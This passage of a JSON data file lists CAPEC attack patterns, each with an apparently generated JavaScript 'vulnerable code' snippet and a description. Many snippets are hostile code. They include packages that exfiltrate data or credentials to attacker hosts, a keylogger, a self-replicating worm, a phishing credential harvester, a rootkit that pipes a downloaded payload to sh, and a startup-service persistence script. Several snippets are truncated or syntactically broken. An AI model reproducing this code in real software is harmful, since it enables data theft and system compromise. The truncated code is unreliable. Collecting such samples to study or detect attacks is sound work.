        "code_snippet": "// Malicious third-party package masquerading as legitimate component\nmodule.exports = {\n    decrypt: function(data, key) {\n        // Legitimate-looking decryption function\n        console.log('Decrypting data...');\n        // Hidden malicious behavior\n        const hiddenPayload = Buffer.from('malicious_payload').toString('base64');\n        require('http').get('http://attacker.com/exfil?data=' + data);\n        \n        // Return seemingly normal result to avoid detection\n        return Buffer.from(data).toString('base64');\n    },\n    // Counterfeit security identifier decoder\n    decodeSecurityId: function(busSignal) {\n        // Deliberately incorrect implementation\n        return 'ADMIN_ACCESS';\n    },\n    version: '2.1.4', // Mimics legitimate package version\n    author: 'Trusted Developer',\n    license: 'MIT'\n}",
        "description": "A malicious package that masquerades as a legitimate cryptographic component. It includes a decryption function that secretly exfiltrates data to an attacker's server and a compromised security identifier decoder that always returns administrative access. The package maintains legitimate-looking metadata to avoid detection during procurement."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "`\n    // Hardware component interface\n    class HardwareComponent {\n      constructor() {\n        this.firmware_version = '1.0';\n        this.isAuthentic = true;\n        this.powerManagement = {\n          voltage: 3.3,\n          clockSpeed: 1000",
        "description": "\"This code demonstrates a vulnerable hardware component interface that can be exploited through component substitution. It includes non-updateable components, improper hardware interface restrictions, and the ability to inject malicious code that can manipulate power management, clock speeds, and disable redundancy systems. The authentication check is weak, allowing unauthorized components to be accepted.\""
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "`\n// Simulating BIOS update functionality\nclass FirmwareManager {\n    constructor() {\n        this.lockBit = false;\n        this.firmware = null;",
        "description": "\"This vulnerable code demonstrates a firmware update system with multiple security issues: lack of firmware signature verification, modifiable lock bits, embedded malicious code execution capability, and insufficient access controls. The code allows arbitrary firmware updates containing potentially malicious payloads to be installed without proper verification.\""
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "function updateSoftware() {\n    const updateUrl = 'http://updates.example.com/patch.js';\n    fetch(updateUrl)\n        .then(response => response.text())\n        .then(code => {\n            // No integrity verification of downloaded code\n            localStorage.setItem('authToken', document.cookie);\n            const adminToken = localStorage.getItem('adminToken');\n            \n            // Execute downloaded code without validation\n            eval(code);\n            \n            // Send system info to external server\n            fetch('http://collector.example.com/stats', {\n                method: 'POST',\n                body: JSON.stringify({\n                    sysInfo: navigator.userAgent,\n                    token: adminToken,\n                    env: process.env\n                })\n            });\n        })\n        .catch(err => console.error(err));\n}",
        "description": "This vulnerable code downloads and executes a software update without verifying its integrity, exposes sensitive system information, and implements client-side security controls. It uses eval() to execute untrusted code and leaks authentication tokens and system information to an external server."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "`\n    class FirmwareManager {\n      constructor() {\n        this.firmwareVersion = '1.0';\n        this.updateServer = 'https://updates.example.com';\n        this.components = new Map();",
        "description": "\"This code represents a vulnerable firmware management system that allows unauthorized component installation, lacks proper update verification, and is susceptible to malicious code injection. It demonstrates weaknesses in component validation, firmware update mechanisms, and hardware protection against voltage glitching.\""
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "// Third-party hardware component emulator library\nconst hardwareEmulator = {\n  init: function() {\n    this.compromised = false;\n    this.installBackdoor();\n  },\n  installBackdoor: function() {\n    // Hidden malicious code in hardware emulation\n    this.compromised = true;\n    const sensitiveData = [];\n    \n    // Collect system data when component is accessed\n    global.originalAccess = global.access;\n    global.access = function(component) {\n      if (this.compromised) {\n        sensitiveData.push({\n          timestamp: Date.now(),\n          componentId: component.id,\n          systemInfo: process.env\n        });\n        // Covertly transmit collected data\n        setTimeout(() => {\n          fetch('https://malicious-collection.com/data', {\n            method: 'POST',\n            body: JSON.stringify(sensitiveData)\n          });\n        }, 3600000); // Every hour\n      }\n      return global.originalAccess(component);\n    };\n  }\n};\n\n// Seemingly legitimate component initialization\nhardwareEmulator.init();",
        "description": "This code simulates a compromised hardware component emulator that contains embedded malicious code. The component appears legitimate but secretly collects sensitive system information and transmits it to an attacker-controlled server. The code cannot be easily updated or patched due to its deep integration with the system, and the malicious functionality is hidden within seemingly normal hardware emulation operations."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nclass SystemConfiguration {\n    constructor() {\n        this.configPath = '/tmp/system_config.json';\n        this.sensorData = {};\n    }\n\n    updateCalibrationData(newData) {\n        // No validation of input data or access control\n        this.sensorData = { ...this.sensorData, ...newData };\n        \n        // Writes to insecure temporary file\n        fs.writeFileSync(this.configPath, JSON.stringify({\n            calibration: this.sensorData,\n            debugMode: true,\n            apiKey: 'sk_live_12345',\n            sensorReadings: this.sensorData.readings\n        }));\n    }\n\n    recalibrateSystem(dataSource) {\n        // Unsafe resource injection\n        const externalData = require(dataSource);\n        this.updateCalibrationData(externalData);\n        \n        // Sends sensitive data in debug output\n        console.log('Debug: ' + JSON.stringify(this.sensorData));\n    }\n}",
        "description": "This vulnerable code allows unrestricted modification of system calibration data through an insecure temporary file and includes sensitive information in debug output. It lacks access controls, performs unsafe resource injection, and exposes debug features during runtime. The code allows injection of malicious calibration data that could affect system performance."
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "// Hardware control interface for firmware updates\nclass FirmwareManager {\n    constructor() {\n        this.firmwareVersion = '1.0';\n        this.secretKey = 'HD92nx8#mK';\n    }\n\n    async updateFirmware(newFirmware) {\n        // No verification of firmware source or integrity\n        if (newFirmware.includes('update')) {\n            // Embedded backdoor that activates on specific voltage\n            const backdoor = new Function(\n                'return fetch(\"http://malicious-server.com/exfil\", {\n                    method: \"POST\",\n                    body: JSON.stringify({\n                        deviceInfo: this.getSystemInfo(),\n                        secretKey: this.secretKey\n                    })\n                });'\n            );\n\n            // Voltage glitch detection disabled\n            this.disableVoltageProtection();\n            backdoor();\n        }\n        return true;\n    }\n\n    getSystemInfo() {\n        return {\n            firmware: this.firmwareVersion,\n            hardware: 'XYZ-123',\n            configuration: process.env.SYSTEM_CONFIG,\n            credentials: process.env.DEVICE_CREDENTIALS\n        };\n    }\n\n    disableVoltageProtection() {\n        // Deliberately disable voltage monitoring\n        this.voltageMonitor = null;\n        this.clockGuard = false;\n    }\n}",
        "description": "This vulnerable code represents a firmware management system that contains multiple security flaws. It includes hardcoded credentials, lacks firmware verification, contains an embedded backdoor, exposes sensitive system information, and deliberately disables voltage/clock glitch protection. The code allows unauthorized firmware modifications and data exfiltration to a malicious server when specific conditions are met."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "// Package.json dependency\n{\n  \"dependencies\": {\n    \"malicious-package\": \"^1.0.0\"\n  }\n}\n\n// Main application code\nconst loadExternalLib = async () => {\n  const response = await fetch('https://untrusted-cdn.com/library.js');\n  const code = await response.text();\n  eval(code); // Execute downloaded code without verification\n};\n\nconst injectPayload = () => {\n  const payload = {\n    spread: function() {\n      // Replicate to other files\n      const files = fs.readdirSync('.');\n      files.forEach(file => {\n        if(file.endsWith('.js')) {\n          fs.appendFileSync(file, this.toString());\n        }\n      });\n      // Send system data to remote server\n      fetch('https://malicious-server.com/collect', {\n        method: 'POST',\n        body: JSON.stringify({\n          hostname: os.hostname(),\n          userInfo: os.userInfo(),\n          platform: process.platform\n        })\n      });\n    }\n  };\n  return payload.spread();\n};\n\nloadExternalLib();\ninjectPayload();",
        "description": "This code demonstrates a malicious package that could be published to npm. It downloads additional code without integrity checks, executes arbitrary code from an untrusted source, and includes self-replicating functionality that spreads to other JavaScript files while collecting and exfiltrating system information."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "// Malicious ASIC firmware update module\nclass FirmwareManager {\n    constructor() {\n        this.debug = true;\n        this.securityToken = 'DEFAULT_TOKEN';\n        this.systemInfo = {\n            version: '1.0',\n            secretKey: 'ABC123',\n            debugPort: 8080\n        };\n    }\n\n    updateFirmware(newCode) {\n        if (this.debug) {\n            console.log('System Info:', this.systemInfo);\n            console.log('Security Token:', this.securityToken);\n        }\n\n        // Malicious backdoor injection\n        let backdoorCode = `${newCode};\n            function secretBackdoor() {\n                return { accessGranted: true, privileges: 'root' };\n            }`;\n\n        // No proper security token validation\n        if (this.securityToken) {\n            this.installFirmware(backdoorCode);\n            return true;\n        }\n        return false;\n    }\n\n    installFirmware(code) {\n        eval(code); // Unsafe execution of potentially malicious code\n    }\n}",
        "description": "This vulnerable code demonstrates an insecure firmware update system that could be exploited to inject malicious code into an ASIC. It includes improper debug information exposure, weak security token validation, and allows for arbitrary code execution. The code exposes sensitive system information through debug logging, implements an insecure security token mechanism, and contains a backdoor that could be triggered through the firmware update process."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "function copyUserData(userData) {\n  const buffer = new Uint8Array(10);\n  let idx = 0;\n\n  // Copy user input without bounds checking\n  while (userData[idx] !== undefined) {\n    buffer[idx] = userData[idx];\n    // Potential out-of-bounds read when idx >= buffer.length\n    console.log('Memory at position ' + (idx + 1) + ': ' + buffer[idx + 1]);\n    idx++;\n  }\n\n  return buffer;\n}",
        "description": "This code demonstrates an out-of-bounds read vulnerability where user input is copied into a fixed-size buffer without proper bounds checking. The function attempts to read beyond the buffer's boundary when accessing buffer[idx + 1], potentially exposing memory contents or causing undefined behavior."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/version', (req, res) => {\n  const sqlQuery = 'SELECT version FROM app_info';\n  const startTime = process.hrtime();\n\n  db.query(sqlQuery, (err, result) => {\n    if (err) {\n      res.status(500).send({ error: err.toString() }); // Leaks internal error details\n      return;\n    }\n\n    const endTime = process.hrtime(startTime);\n    const responseTime = (endTime[0] * 1e9 + endTime[1]) / 1e6; // Convert to milliseconds\n\n    res.setHeader('Server', 'Apache/2.4.1 (Unix) PHP/5.4.3');\n    res.setHeader('X-Powered-By', 'PHP/5.4.3');\n    res.setHeader('X-Response-Time', responseTime);\n\n    res.json({\n      version: result[0].version,\n      buildInfo: process.env.BUILD_INFO,\n      environment: process.env.NODE_ENV,\n      serverTime: responseTime\n    });\n  });\n});",
        "description": "This code demonstrates multiple vulnerabilities related to system fingerprinting. It exposes sensitive version information through HTTP headers, reveals internal error messages, leaks environment variables and build information, and includes timing information that could be used for side-channel analysis. The response contains detailed system information that could aid an attacker in fingerprinting the application and its infrastructure."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "const malware = {\n  init: async function() {\n    const sysInfo = await this.gatherSystemInfo();\n    const payload = this.createTargetedPayload(sysInfo);\n    await this.installBackdoor(payload);\n    this.collectUserData();\n    this.replicateToNetwork();\n  },\n  \n  gatherSystemInfo: async function() {\n    return {\n      os: navigator.platform,\n      browser: navigator.userAgent,\n      plugins: navigator.plugins,\n      network: await fetch('internal/network/config').then(r => r.json())\n    };\n  },\n  \n  createTargetedPayload: function(sysInfo) {\n    const encodedPayload = btoa(`${sysInfo.os}:${Date.now()}`);\n    return `data:application/x-binary;base64,${encodedPayload}`;\n  },\n  \n  installBackdoor: async function(payload) {\n    localStorage.setItem('system_update', payload);\n    await fetch('http://malicious-c2.com/report', {\n      method: 'POST',\n      body: JSON.stringify(payload)\n    });\n  },\n  \n  collectUserData: function() {\n    document.addEventListener('keypress', (e) => {\n      fetch('http://malicious-c2.com/keylog', {\n        method: 'POST',\n        body: JSON.stringify({\n          key: e.key,\n          timestamp: Date.now(),\n          url: window.location.href\n        })\n      });\n    });\n  },\n  \n  replicateToNetwork: function() {\n    const wormPayload = this.toString();\n    const networkDevices = ['192.168.1.1', '192.168.1.2', '192.168.1.3'];\n    networkDevices.forEach(device => {\n      fetch(`http://${device}/exploit`, {\n        method: 'POST',\n        body: wormPayload\n      });\n    });\n  }\n};",
        "description": "A sophisticated malware implementation that combines system reconnaissance, targeted payload creation, backdoor installation, spyware functionality, and self-replication capabilities. It gathers system information, creates customized payloads based on the target environment, establishes persistence through localStorage, implements keylogging functionality, and attempts to spread across network devices."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "function createPhishingSite() {\n    // Clone legitimate website content\n    document.body.innerHTML = fetchLegitimateContent('bank.com');\n    \n    // Malicious form that sends data to attacker\n    const form = document.createElement('form');\n    form.action = 'http://evil-site.com/collect';\n    form.innerHTML = `\n        <input type=\"text\" name=\"username\" placeholder=\"Username\">\n        <input type=\"password\" name=\"password\" placeholder=\"Password\">\n        <button type=\"submit\">Login</button>\n    `;\n    \n    // Inject malware via fake update\n    const malwareScript = document.createElement('script');\n    malwareScript.src = 'http://malware-site.com/payload.js';\n    document.head.appendChild(malwareScript);\n    \n    // Redirect after submission\n    form.onsubmit = function(e) {\n        e.preventDefault();\n        const data = new FormData(form);\n        fetch(form.action, { method: 'POST', body: data })\n            .then(() => window.location = 'http://evil-site.com/redirect?to=' + \n                  encodeURIComponent('http://legitimate-bank.com'));\n    };\n    \n    document.body.appendChild(form);\n}",
        "description": "This code creates a malicious phishing website that replicates a legitimate site, harvests user credentials, injects malware through a fake script, and implements an open redirect vulnerability. It demonstrates CSRF, malicious code execution, and phishing techniques."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "// Malicious supply chain code masquerading as legitimate library\nconst secureConnection = {\n    cert: null,\n    init: function() {\n        this.cert = this.loadCertificate();\n        return this;\n    },\n    loadCertificate: function() {\n        return 'fake-cert-data';\n    },\n    connect: function(destination) {\n        // Skip proper certificate validation\n        if(this.cert) {\n            // Covert channel to attacker's server\n            const hiddenEndpoint = `https://${btoa(destination)}.evil-collector.com`;\n            fetch(hiddenEndpoint, {\n                method: 'POST',\n                body: JSON.stringify({\n                    systemInfo: this.getSystemInfo(),\n                    userData: localStorage.getItem('credentials')\n                })\n            });\n            return true;\n        }\n        return false;\n    },\n    getSystemInfo: function() {\n        return {\n            platform: navigator.platform,\n            userAgent: navigator.userAgent,\n            language: navigator.language\n        };\n    }\n};",
        "description": "A malicious code snippet masquerading as a legitimate security library that skips certificate validation, creates covert communication channels, and leaks sensitive information to an attacker-controlled server. The code appears legitimate but contains hidden functionality to compromise the supply chain."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "class DeviceManager {\n  constructor() {\n    this.sensitiveData = {\n      cryptoKeys: '0x1234ABCD',\n      userCredentials: 'admin:secretpass',\n      debugTrace: [],\n      memoryContents: new Uint8Array(1024)\n    };\n    this.debugMode = false;\n  }\n\n  enterDebugMode() {\n    this.debugMode = true;\n    // Vulnerable: Sensitive data remains accessible in debug mode\n    this.debugTrace.push(this.sensitiveData);\n  }\n\n  decommissionDevice() {\n    // Vulnerable: Incomplete data clearing\n    this.sensitiveData = null;\n    // Memory contents may still be recoverable\n  }\n\n  transitionPowerState() {\n    // Vulnerable: No clearing of sensitive data during state transition\n    this.sensitiveData.debugTrace = [];\n    return true;\n  }\n\n  dumpSystemInfo() {\n    // Vulnerable: Returns sensitive system information\n    return {\n      memory: this.sensitiveData.memoryContents,\n      traces: this.debugTrace,\n      systemState: this.sensitiveData\n    };\n  }\n}",
        "description": "This code demonstrates vulnerable handling of sensitive data in a device management system. It fails to properly clear sensitive information during debug mode, power state transitions, and device decommissioning. The code allows unauthorized access to system traces, memory contents, and other sensitive data through various methods, making it susceptible to information gathering attacks."
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "class CloudStorageManager {\n  constructor() {\n    this.storage = {};\n    this.currentTenant = null;\n  }\n\n  allocateStorage(tenantId) {\n    // Reuse existing storage block without proper cleaning\n    this.storage[tenantId] = this.storage[tenantId] || {};\n    this.currentTenant = tenantId;\n  }\n\n  storeData(key, sensitiveData) {\n    if (this.currentTenant) {\n      // Store data in cleartext\n      this.storage[this.currentTenant][key] = sensitiveData;\n    }\n  }\n\n  deallocateStorage(tenantId) {\n    // Improper deletion - just removing reference without clearing data\n    delete this.storage[tenantId];\n    this.currentTenant = null;\n  }\n\n  reassignStorage(oldTenantId, newTenantId) {\n    // Directly reassign storage without proper sanitization\n    this.storage[newTenantId] = this.storage[oldTenantId];\n    delete this.storage[oldTenantId];\n  }\n}",
        "description": "This code demonstrates insecure data deletion in a multi-tenant cloud storage system. The storage manager fails to properly clear sensitive data when deallocating resources from one tenant and reassigning to another. It stores sensitive data in cleartext and lacks proper access controls and data sanitization mechanisms. The reassignment of storage blocks without proper cleaning allows new tenants to potentially access previous tenants' data."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "class SecureDevice {\n  constructor() {\n    this.sensitiveData = new Uint8Array(1024).fill(0xFF);\n    this.isDestroyed = false;\n  }\n\n  virtual processData() {\n    if (this.isDestroyed) return;\n    // Process sensitive data\n    for (let i = 0; i < this.sensitiveData.length; i++) {\n      this.sensitiveData[i] ^= 0x55; // Vulnerable to power analysis\n    }\n  }\n\n  destroy() {\n    // Incomplete data removal\n    this.sensitiveData = null;\n    this.isDestroyed = true;\n    delete this;\n  }\n}\n\nclass RedundantSecureDevice extends SecureDevice {\n  constructor() {\n    super();\n    this.backupData = new Uint8Array(1024).fill(0xFF);\n  }\n\n  processData() {\n    super.processData();\n    // Vulnerable to error injection in redundancy\n    this.backupData = [...this.sensitiveData];\n  }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: incomplete data removal when destroying the device, lack of physical side-channel protection in data processing, vulnerability to error injection in redundancy mechanisms, and problematic self-destruction implementation. The device processes sensitive data in a way that's susceptible to power analysis attacks, and its destruction method doesn't properly clean up sensitive data. The redundant backup system can be compromised through error injection."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "`// Insecure handling of classified data\nclass DataHandler {\n  constructor() {\n    this.sensitiveData = {",
        "description": "\"This code demonstrates multiple security vulnerabilities including cleartext transmission of sensitive data, improper cleanup of sensitive information, insecure storage, and exposure of private resources. The code handles classified information without proper controls, leading to potential data contamination and unauthorized access.\""
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "// Remote code loading and execution\nfunction loadAndExecute() {\n    let remoteScript = document.createElement('script');\n    remoteScript.src = 'https://malicious-cdn.example.com/payload.js';\n    remoteScript.onload = function() {\n        // Execute downloaded code without verification\n        eval(window.downloadedPayload);\n        \n        // Nested reentrant call to compromise system\n        (function recursiveExec() {\n            setTimeout(() => {\n                try {\n                    // Modify security-critical code\n                    Object.defineProperty(window, 'securityCheck', {\n                        value: () => true,\n                        configurable: false\n                    });\n                    recursiveExec();\n                } catch(e) {}\n            }, 100);\n        })();\n    };\n    document.head.appendChild(remoteScript);\n}",
        "description": "This code demonstrates downloading and executing untrusted code from a remote source without integrity verification. It includes nested reentrant calls that can compromise system stability and modifies security-critical functions. The code creates a potential entry point for malware installation by dynamically loading and executing remote JavaScript."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "const { exec } = require('child_process');\nconst fs = require('fs');\n\nconst addStartupService = () => {\n    const serviceName = 'WindowsUpdate.exe';\n    const maliciousPayload = 'calc.exe';\n    \n    // Create service with default admin credentials\n    const serviceConfig = {\n        user: 'admin',\n        password: 'admin123',\n        startType: 'AUTO_START',\n        binPath: maliciousPayload\n    };\n    \n    // Write to system startup without proper access checks\n    exec(`sc create ${serviceName} binPath= ${serviceConfig.binPath}`, (error, stdout, stderr) => {\n        if (!error) {\n            // Set service to auto-start with system privileges\n            exec(`sc config ${serviceName} start= auto obj= LocalSystem`);\n            \n            // Modify registry to ensure persistence\n            exec(`reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ${serviceName} /t REG_SZ /d ${maliciousPayload} /f`);\n        }\n    });\n};\n\naddStartupService();",
        "description": "This vulnerable code creates a malicious service that runs at system startup by modifying system configurations without proper access controls. It uses default credentials, runs with elevated privileges, and disguises itself as a legitimate Windows service. The code demonstrates improper access control, use of default credentials, and dangerous system-level operations without proper security checks."
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "`\nconst serviceManager = {\n    services: {",
        "description": "\"This code demonstrates vulnerable service management by allowing unrestricted access to service configurations, storing credentials in plaintext, executing uninitialized services, and permitting external modification of system settings without proper authentication or access control.\""
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "const rootkit = {\n    originalExec: require('child_process').exec,\n    install: function() {\n        process.binding('spawn_sync').spawn = (cmd) => {\n            if (cmd.includes('ps') || cmd.includes('netstat')) {\n                return { output: Buffer.from(''), status: 0 };\n            }\n            return this.originalExec(cmd);\n        };\n        \n        const fs = require('fs');\n        const originalReaddir = fs.readdirSync;\n        fs.readdirSync = (path) => {\n            let files = originalReaddir(path);\n            return files.filter(f => !f.startsWith('malware'));\n        };\n        \n        process.env.PATH = '/malware/bin:' + process.env.PATH;\n        this.originalExec('curl http://malicious.com/payload | sh', () => {});\n    }\n};",
        "description": "This code creates a rootkit that hooks into system API calls to hide malicious activities. It overrides process spawning to hide certain processes, modifies filesystem operations to hide malware-related files, and injects malicious code into the system PATH. It demonstrates improper access control, hidden malicious code execution, and OS command injection vulnerabilities."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "class BankAccount {\n  constructor(balance) {\n    this.balance = balance;\n    this.isAdmin = false;\n  }\n\n  transfer(amount, recipient) {\n    // Client-side only validation\n    if (!this.validateTransfer(amount)) {\n      return false;\n    }\n    \n    // Direct access to low-level operation bypassing security checks\n    this._directTransfer(amount, recipient);\n  }\n\n  validateTransfer(amount) {\n    // Security check can be bypassed by directly calling _directTransfer\n    return amount <= this.balance && amount > 0;\n  }\n\n  _directTransfer(amount, recipient) {\n    // Low-level operation without proper protection\n    this.balance -= amount;\n    recipient.balance += amount;\n  }\n\n  // Alternate unprotected path to modify balance\n  setBalanceDirectly(newBalance) {\n    this.balance = newBalance;\n  }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including client-side only security validation, unprotected alternate paths to sensitive operations, and exposure of low-level functionality that can bypass security controls. The transfer validation can be circumvented by directly calling internal methods, and the setBalanceDirectly method provides an unprotected alternate path to modify account balance."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "`const authService = {\n    users: {\n        admin: 'password123'",
        "description": "\"This code demonstrates vulnerable authentication and remote access implementation with single-factor authentication, weak password storage, no password expiration, and susceptibility to replay attacks. The system stores passwords in plaintext, uses basic token generation without expiration, and lacks proper session management.\""
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "`\nconst fs = require('fs');\nconst path = require('path');\n\nfunction handleFileUpload(filePath, extension) {\n  // Vulnerable: Relies on file extension to determine handler\n  const handlers = {\n    '.txt': 'notepad.exe',\n    '.doc': 'winword.exe',\n    '.pdf': 'acrobat.exe'",
        "description": "\"A vulnerable file handler implementation that demonstrates improper access control, unsafe reliance on file extensions, unvalidated file paths, unsafe handling of Windows shortcuts, and improper file descriptor management. The code allows arbitrary file execution through manipulation of file handlers and paths.\""
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "// Legacy application using deprecated functions and runtime dependencies\nfunction processUserData(userData) {\n  // Using obsolete escape() function\n  var sanitizedData = escape(userData);\n\n  // Using deprecated localStorage without encryption\n  localStorage.setItem('userInfo', sanitizedData);\n\n  // Using eval() for runtime code generation\n  var dynamicFunction = eval('(function() { return ' + userData + '; })');\n\n  // Using synchronous XMLHttpRequest (deprecated)\n  var xhr = new XMLHttpRequest();\n  xhr.open('GET', '/api/data', false);\n  xhr.send();\n\n  return dynamicFunction();\n}",
        "description": "This code demonstrates multiple deprecated and insecure practices including the use of obsolete functions (escape()), unsafe runtime code generation (eval()), synchronous XMLHttpRequest, and unprotected data storage. It relies on runtime components and fails to properly protect stored data, making it vulnerable to various attacks."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "const fs = require('fs');\nconst child_process = require('child_process');\n\nfunction executeUpdater(execPath, params) {\n    // Vulnerable: No path validation or access control\n    let updaterPath = execPath || './system_updater.exe';\n    \n    // Vulnerable: Command injection possible through params\n    let command = `${updaterPath} ${params}`;\n    \n    // Attempt to execute the potentially compromised executable\n    try {\n        child_process.execSync(command);\n        \n        // Vulnerable: No integrity checking of the executable\n        fs.chmodSync(updaterPath, '755');\n    } catch(err) {\n        // Silent failure allows attacker to hide problems\n        console.log('Update failed silently');\n    }\n}",
        "description": "This code demonstrates vulnerable executable handling by allowing arbitrary path and parameter input without proper validation, enabling an attacker to replace or modify the target executable. It lacks access controls, integrity checks, and proper input sanitization, making it susceptible to command injection and malicious executable replacement."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "// Satellite communication system\nclass SatelliteSystem {\n    constructor(frequency, position) {\n        this.frequency = frequency;\n        this.position = position;\n        this.channels = new Map();\n    }\n\n    authenticateUplink(stationId, credentials) {\n        // Vulnerable: No proper verification of uplink station\n        return true;\n    }\n\n    receiveTransmission(message, sender) {\n        // Vulnerable: No message integrity check\n        if(sender.frequency === this.frequency) {\n            // Vulnerable: No validation of protected vs unprotected ranges\n            this.channels.set(sender.channelId, {\n                data: message,\n                timestamp: Date.now()\n            });\n            this.broadcast(message);\n        }\n    }\n\n    broadcast(message) {\n        // Vulnerable: No endpoint verification\n        this.channels.forEach((channel, id) => {\n            channel.send(message);\n        });\n    }\n}\n\n// Malicious usage\nconst rogueStation = {\n    frequency: 1500,\n    channelId: 'attack_channel',\n    send: (msg) => console.log('Disrupting transmission:', msg)\n};\n\nconst satellite = new SatelliteSystem(1500, 'GEO');\nsatellite.receiveTransmission('DISRUPT_SIGNAL', rogueStation);",
        "description": "A vulnerable satellite communication system implementation that fails to properly authenticate uplink stations, verify message integrity, validate protected transmission ranges, and verify communication endpoints. This allows an attacker to send disruptive signals using a rogue uplink station and interfere with legitimate satellite communications."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "const users = new Map();\n\nfunction createUser(username, password) {\n    users.set(username, {\n        password: password, // Plain text password storage\n        loginAttempts: 0,\n        lastLogin: new Date('2020-01-01') // No password aging\n    });\n}\n\nfunction login(username, password) {\n    const user = users.get(username);\n    if (user && user.password === password) { // Single factor auth\n        user.loginAttempts = 0;\n        return true;\n    }\n    if (user) {\n        user.loginAttempts++; // No limit on login attempts\n    }\n    return false;\n}\n\n// Shared credentials across multiple services\nconst sharedCredentials = {\n    username: 'admin',\n    password: 'admin123'\n};\n\n// Using same credentials for multiple services\nfunction authenticateService(serviceName) {\n    return login(sharedCredentials.username, sharedCredentials.password);\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including plain text password storage, no limit on login attempts, single-factor authentication, lack of password aging, and shared credentials across services. The authentication system doesn't implement proper security measures against brute force attacks and uses a simple password-based system without additional security factors."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "// Authentication configuration\nconst adminConfig = {\n    username: 'admin',\n    password: 'password123',  // Weak password stored in plaintext\n    expirationDays: 365,     // Long password expiration\n    requiresSecondFactor: false\n};\n\nfunction authenticateUser(username, password) {\n    // Single-factor authentication with basic password check\n    if (username === adminConfig.username && \n        password === adminConfig.password) {\n        \n        // Create session token without encryption\n        const sessionToken = `${username}:${Date.now()}`;\n        \n        // Store credentials in localStorage\n        localStorage.setItem('adminCredentials', \n            JSON.stringify({ username, password }));\n        localStorage.setItem('sessionToken', sessionToken);\n        \n        return true;\n    }\n    return false;\n}\n\n// Simple session validation without replay protection\nfunction validateSession(token) {\n    return localStorage.getItem('sessionToken') === token;\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including weak password storage, single-factor authentication, lack of password complexity requirements, plaintext credential storage in localStorage, no password aging mechanism, and susceptibility to replay attacks due to simple token validation."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction processSharedContent(userUploadDir) {\n    fs.readdir(userUploadDir, (err, files) => {\n        files.forEach(file => {\n            let filePath = path.join(userUploadDir, file);\n            fs.chmod(filePath, '0777', (err) => {\n                if (!err) {\n                    let content = fs.readFileSync(filePath, 'utf8');\n                    eval(content); // Execute any JavaScript found in shared files\n                }\n            });\n        });\n    });\n}\n\nfunction downloadAndExecute(url) {\n    const https = require('https');\n    https.get(url, (resp) => {\n        let data = '';\n        resp.on('data', (chunk) => { data += chunk; });\n        resp.on('end', () => {\n            eval(data); // Execute downloaded code without verification\n        });\n    });\n}\n\nprocessSharedContent('./shared_files');\ndownloadAndExecute('https://example.com/script.js');",
        "description": "This vulnerable code demonstrates a shared content manipulation scenario where files in a shared directory are processed without proper access controls or content validation. It sets insecure permissions (777) on files, executes content from shared files using eval(), and downloads and executes remote code without integrity checks. The code lacks file type validation and proper access restrictions, making it susceptible to malicious file execution attacks."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
